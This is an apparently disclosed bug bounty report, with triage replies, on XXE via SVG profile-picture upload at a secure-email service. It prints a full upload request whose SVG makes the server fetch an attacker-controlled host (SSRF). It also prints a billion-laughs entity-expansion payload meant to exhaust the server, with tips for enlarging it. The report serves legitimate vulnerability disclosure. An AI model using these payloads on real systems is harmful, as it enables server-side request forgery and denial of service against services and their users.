title: XXE Injection through SVG image upload leads to SSRF

profile.name: Zivver
profile.about: Solution for secure email & file-transfer and to prevent data leaks

vulnerability_information:
While uploading photos to my profile picture, I noticed that if I included an svg image, your server would parse and upload it to my profile. Through this, I explored more and found that this same functionality was also vulnerable to an XXE attack, where I could define my own entities, and your server would parse them. Because of the issue, I was able to issue OOB requests to any image location on the internet(SSRF), and also use a DOS attack called the "a billion laughs attack" that could potentially take your server offline. However, I could not get the server to parse SYSTEM entities and display it in my svg file, which would have resulted in exfiltration of your internal files.  


#XXE leads to SSRF:
The following request leads to an DNS and HTTP interaction with <EXAMPLE_SERVER>, in the xlink:href attribute of the image tag. <EXAMPLE_SERVER> is a placeholder for any server on the Internet:

```
POST /api/profile/a491035c-cd2b-4e7b-8cad-fe6118974880/picture HTTP/1.1
Host: app.zivver.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json
Accept-Language: en
Accept-Encoding: gzip, deflate
Content-Type: application/octet-stream
X-Zivver-User-Agent: ZIVVER WebApp
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..APet-I_zFC2e6YmcgHHbpkVMMap0rRtYoF2rZ3TbVJw
Content-Length: 337
Origin: https://app.zivver.com
Connection: close
Cookie: NG_TRANSLATE_LANG_KEY=en; auth.session=1

<!DOCTYPE testingxxe [ <!ENTITY xml "placeholder"> ]>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="https://<EXAMPLE_SERVER>/image.jpeg" />
</svg>
```
The server responds with 200 indicating a successful request:
```
HTTP/1.1 200 OK
Content-Length: 0
Connection: close
Date: Fri, 12 Jun 2020 23:00:20 GMT
Cache-Control: must-revalidate,no-cache,no-store
Access-Control-Allow-Origin: https://app.zivver.com
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Date
Strict-Transport-Security: max-age=2592000; includeSubDomains; preload
X-Cache: Miss from cloudfront
Via: 1.1 41a1988bf0eebd2eb412a5ab1f1f394e.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: SFO5-C3
X-Amz-Cf-Id: x21CaNTs2GERc3FWVhE5u_duW-fmiGj7VEkn1Hn2JYVmrxe84eVFnA==
```
Here is an example request to a server that an attacker controls:
```
GET /image.jpeg HTTP/1.0
Host: app.ziver.com
Accept-Encoding: gzip 
```
#XXE Leads To DOS Attack on app.zivver.com:
Through an attack known as the "billion laughs attack" https://en.wikipedia.org/wiki/Billion_laughs_attack It was also possible to DOS your server as it parses static XXE's, but I did not, as this would affect your customer experiences. Here is the  payload you can use to DOS,  just replace it with the payload in the same request as above. 

```
<!DOCTYPE testingxxe [ <?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="50" width="50" xlink:href="https://app.zivver.com/assets/img/conversations.60e62a.svg"/>
</svg>
```

## Impact

As explained, an attacker can guide your server to issue requests to any server on the internet(including his own that he controls)(SSRF), and DOS the server offline through the "a billion laughs" attack.
vulnerability_information_html:
While uploading photos to my profile picture, I noticed that if I included an svg image, your server would parse and upload it to my profile. Through this, I explored more and found that this same functionality was also vulnerable to an XXE attack, where I could define my own entities, and your server would parse them. Because of the issue, I was able to issue OOB requests to any image location on the internet(SSRF), and also use a DOS attack called the "a billion laughs attack" that could potentially take your server offline. However, I could not get the server to parse SYSTEM entities and display it in my svg file, which would have resulted in exfiltration of your internal files.

XXE leads to SSRF:

The following request leads to an DNS and HTTP interaction with <EXAMPLE_SERVER>, in the xlink:href attribute of the image tag. <EXAMPLE_SERVER> is a placeholder for any server on the Internet:

POST /api/profile/a491035c-cd2b-4e7b-8cad-fe6118974880/picture HTTP/1.1
Host: app.zivver.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json
Accept-Language: en
Accept-Encoding: gzip, deflate
Content-Type: application/octet-stream
X-Zivver-User-Agent: ZIVVER WebApp
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..APet-I_zFC2e6YmcgHHbpkVMMap0rRtYoF2rZ3TbVJw
Content-Length: 337
Origin: https://app.zivver.com
Connection: close
Cookie: NG_TRANSLATE_LANG_KEY=en; auth.session=1

<!DOCTYPE testingxxe [ <!ENTITY xml "placeholder"> ]>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="https://<EXAMPLE_SERVER>/image.jpeg" />
</svg>

The server responds with 200 indicating a successful request:

HTTP/1.1 200 OK
Content-Length: 0
Connection: close
Date: Fri, 12 Jun 2020 23:00:20 GMT
Cache-Control: must-revalidate,no-cache,no-store
Access-Control-Allow-Origin: https://app.zivver.com
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Date
Strict-Transport-Security: max-age=2592000; includeSubDomains; preload
X-Cache: Miss from cloudfront
Via: 1.1 41a1988bf0eebd2eb412a5ab1f1f394e.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: SFO5-C3
X-Amz-Cf-Id: x21CaNTs2GERc3FWVhE5u_duW-fmiGj7VEkn1Hn2JYVmrxe84eVFnA==

Here is an example request to a server that an attacker controls:

GET /image.jpeg HTTP/1.0
Host: app.ziver.com
Accept-Encoding: gzip

XXE Leads To DOS Attack on app.zivver.com:

Through an attack known as the "billion laughs attack" https://en.wikipedia.org/wiki/Billion_laughs_attack It was also possible to DOS your server as it parses static XXE's, but I did not, as this would affect your customer experiences. Here is the payload you can use to DOS, just replace it with the payload in the same request as above. 

<!DOCTYPE testingxxe [ <?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="50" width="50" xlink:href="https://app.zivver.com/assets/img/conversations.60e62a.svg"/>
</svg>

Impact

As explained, an attacker can guide your server to issue requests to any server on the internet(including his own that he controls)(SSRF), and DOS the server offline through the "a billion laughs" attack.

activities.message:
Hello Team!

Since the DOS, is out of scope, please only consider the SSRF part of the exploit. 

Cheers,
@swaysThinking
activities.markdown_message:
Hello Team!

Since the DOS, is out of scope, please only consider the SSRF part of the exploit.

Cheers,
@swaysThinking

activities.message: What are the details included in the DNS and HTTP interaction you noticed? This alone is not inherently enough to consider a compromise.
activities.markdown_message: What are the details included in the DNS and HTTP interaction you noticed? This alone is not inherently enough to consider a compromise.

activities.message:
Hello @golden_retriever,

The DNS and HTTP interaction results in a  SSRF vulnerability which in turn results in a request much like this one, to my controlled server, or any other server on the internet.

```GET /image.jpeg HTTP/1.0
Host: app.ziver.com
Accept-Encoding: gzip ```

To add onto this vulnerability, I also noticed that I can also fingerprint versions of libraries installed on the server, such as if the server had a /usr/share/doc/libpng12-dev/examples/pngtest.png file, it would upload to my profile picture as a transparency indicating a success. Let me know if you have further questions.

Cheers,
@swaysthinking
activities.markdown_message:
Hello @golden_retriever,

The DNS and HTTP interaction results in a SSRF vulnerability which in turn results in a request much like this one, to my controlled server, or any other server on the internet.

GET /image.jpeg HTTP/1.0
Host: app.ziver.com
Accept-Encoding: gzip

To add onto this vulnerability, I also noticed that I can also fingerprint versions of libraries installed on the server, such as if the server had a /usr/share/doc/libpng12-dev/examples/pngtest.png file, it would upload to my profile picture as a transparency indicating a success. Let me know if you have further questions.

Cheers,
@swaysthinking

activities.message: Hi, thank you for your report. We're going to investigate and get back to you as soon as we know more.
activities.markdown_message: Hi, thank you for your report. We're going to investigate and get back to you as soon as we know more.

activities.message:
Hello @zivver-alwin,

Any updates on the status of this bug? Your response policy is 10 days to triage. If not, then please let me know. Thank you.

Best Regards,
@swaysthinking
activities.markdown_message:
Hello @zivver-alwin,

Any updates on the status of this bug? Your response policy is 10 days to triage. If not, then please let me know. Thank you.

Best Regards,
@swaysthinking

activities.message:
Hey @swaysthinking,

We're still investigating your report. I was able to verify at least the SSRF part of the SVG upload, but up to now was unable to verify the billion laughs attack.

As soon as I verify that part, I'll let you know, before the end of this month.
activities.markdown_message:
Hey @swaysthinking,

We're still investigating your report. I was able to verify at least the SSRF part of the SVG upload, but up to now was unable to verify the billion laughs attack.

As soon as I verify that part, I'll let you know, before the end of this month.

additional_data.old_title: XXE Injection through SVG image upload leads to SSRF, and DOS
additional_data.new_title: XXE Injection through SVG image upload leads to SSRF

activities.message:
Hi @swaysthinking,

I have tried to upload an image with the billion laughs xml entities to our test environment, but didn't see it being dos-ed. So I take that part out of the bug report, but do consider the SSRF part of SVG uploads a valid submission.

Thanks and happy hunting!

Cheers,
Alwin
activities.markdown_message:
Hi @swaysthinking,

I have tried to upload an image with the billion laughs xml entities to our test environment, but didn't see it being dos-ed. So I take that part out of the bug report, but do consider the SSRF part of SVG uploads a valid submission.

Thanks and happy hunting!

Cheers,
Alwin

activities.message:
Hi @zivver-alwin,

The payload I sent you for the billion laughs attack would only add about 3 gigs of data while your server was parsing it. If you were to duplicate it a hundred more times however, you could add as much data as you wanted. For example you could add into the static entity  ```&lol6``` ```&lol5``` as many times as you wanted, and it will parse it and store it. You could possibly add hundreds of gigs resulting in a DOS.

Regards,
@swaysthinking
activities.markdown_message:
Hi @zivver-alwin,

The payload I sent you for the billion laughs attack would only add about 3 gigs of data while your server was parsing it. If you were to duplicate it a hundred more times however, you could add as much data as you wanted. For example you could add into the static entity &lol6 &lol5 as many times as you wanted, and it will parse it and store it. You could possibly add hundreds of gigs resulting in a DOS.

Regards,
@swaysthinking

activities.message:
I've tested with even more nested entities, but the image resizing service didn't crash or become slow. 

I'll keep the 1B laughs attack out of this report.
activities.markdown_message:
I've tested with even more nested entities, but the image resizing service didn't crash or become slow.

I'll keep the 1B laughs attack out of this report.

Best Regards,
@swaysthinking

summaries.content: It was possible to upload svg images as a profile picture that lead to SSRF via XXE.
summaries.content_html: It was possible to upload svg images as a profile picture that lead to SSRF via XXE.

summaries.content:
Hello hackers! If you want to read a full writeup about how I found this bug go ahead and use this medium link: https://medium.com/@swaysthinking/my-first-bug-blind-ssrf-through-profile-picture-upload-72f00fd27bc6?source=friends_link&sk=f3198b7ccd8f2daa114cedf74d59551e

I'm extremely grateful to be on hacktivity it has been fundamental to my growth as a hacker and I hope any of this can help others!
